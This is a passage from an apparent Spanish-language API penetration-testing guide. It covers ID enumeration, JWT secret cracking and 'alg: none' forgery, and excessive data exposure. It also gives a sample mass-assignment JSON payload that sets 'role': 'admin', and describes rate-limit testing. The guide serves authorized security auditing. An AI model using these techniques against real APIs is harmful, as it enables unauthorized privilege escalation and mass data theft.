Cuando los identificadores son números enteros secuenciales, el ataque se escala de forma automatizada mediante un bucle simple (del 1 al 1000) en Burp Intruder o un script de Python, permitiendo la exfiltración masiva de toda la base de datos de la aplicación en pocos segundos. Si la API utiliza UUIDs impredecibles en lugar de enteros, esto añade oscuridad pero no seguridad; los UUIDs pueden ser descubiertos explorando otros puntos finales de la API o mediante mensajes de error.

<br>

### 5.4 Autenticación Rota y Exposición Excesiva de Datos en APIs
La autenticación rota en APIs se manifiesta frecuentemente por la falta de limitación de tasa (*rate limiting*) en los puntos finales de inicio de sesión o verificación de códigos OTP. Dado que las APIs están diseñadas para acceso programático, los desarrolladores suelen omitir protecciones como CAPTCHA o bloqueos de cuenta. Esto permite enviar miles de intentos de combinación de credenciales por minuto, facilitando ataques de fuerza bruta y *credential stuffing*.

Asimismo, los defectos en la implementación de JWT representan un vector crítico. Si el secreto de firma utilizado en algoritmos HS256 es débil o predecible (como palabras de diccionario), un auditor puede descifrar la clave sin conexión mediante `hashcat` o `jwt_tool` y forjar tokens con privilegios administrativos. Otro fallo relevante es el ataque de algoritmo `none`, donde el auditor modifica el encabezado a `"alg": "none"`, elimina la firma del token y la API acepta el token manipulado sin validar la firma.

La Exposición Excesiva de Datos (Excessive Data Exposure) se produce cuando la API devuelve objetos JSON completos leídos de la base de datos, confiando erróneamente en que la aplicación de cliente (web o móvil) se encargará de filtrar los campos sensibles antes de mostrarlos en pantalla. Si la respuesta JSON de un perfil público incluye campos privados como `password_hash`, `api_key`, `credit_balance` o `role`, cualquier usuario que inspeccione la respuesta HTTP sin procesar en Burp Suite accederá a dicha información sensible. Al combinar la Exposición Excesiva de Datos con una vulnerabilidad BOLA, la falla se escala de un problema de control de acceso a una fuga masiva de datos críticos.

<br>

### 5.5 Asignación Masiva (Mass Assignment) y Limitación de Tasa
La Asignación Masiva (Mass Assignment) ocurre cuando la API toma los datos JSON enviados por el cliente en una petición de actualización (POST, PUT o PATCH) y los enlaza directamente a los modelos de objetos internos del servidor, sin filtrar qué campos está autorizado a modificar el cliente.

Por ejemplo, cuando un usuario edita su perfil mediante la solicitud `PATCH /v1/users/me` enviando `{"email": "nuevo@correo.com"}`, el objeto interno del usuario en el servidor contiene campos adicionales como `role`, `is_admin` o `credit_balance`. Si la API no aplica una lista de permitidos sobre los campos modificables, el atacante puede inyectar parámetros adicionales en el cuerpo JSON:

```json
{
  "email": "nuevo@correo.com",
  "role": "admin",
  "is_admin": true
}
```

Si la API procesa ciegamente todos los campos recibidos, el rol del usuario se actualizará a administrador, logrando una escalada de privilegios horizontal o vertical inmediata sin explotar fallas de autenticación.

Para descubrir campos inyectables en ataques de Asignación Masiva, el auditor analiza los nombres de variables revelados en las respuestas con Exposición Excesiva de Datos o revisa la documentación de la API expuesta (como especificaciones de OpenAPI / Swagger).

Finalmente, las pruebas de limitación de tasa deben ejecutarse en todos los puntos finales de la API que realicen operaciones costosas (envío de SMS, correos electrónicos, generación de PDFs) o sensibles (cambio de clave). Se envía una ráfaga de peticiones idénticas y se verifica si la API devuelve el código `429 Too Many Requests` acompañado de encabezados de control como `X-RateLimit-Limit`, `X-RateLimit-Remaining` y `X-RateLimit-Reset`.
